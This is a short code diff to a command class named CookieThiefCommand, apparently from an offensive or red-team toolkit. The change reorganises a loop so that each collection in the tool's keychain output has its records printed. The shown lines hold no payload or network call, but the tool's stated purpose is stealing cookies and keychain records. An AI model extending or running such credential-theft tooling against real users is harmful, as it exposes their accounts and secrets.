@@ -98,10 +98,11 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         try:
-            for record in record_collection['records']:
-                for line in str(record).split('\n'):
-                    print("%s" % line)
-                    sys.stdout.flush()
+            for record_collection in keychainoutput:
+                for record in record_collection['records']:
+                    for line in str(record).split('\n'):
+                        print("%s" % line)
+                        sys.stdout.flush()
         except Exception as e:
             print("Print failed with error: " + str(e))
             sys.stdout.flush()
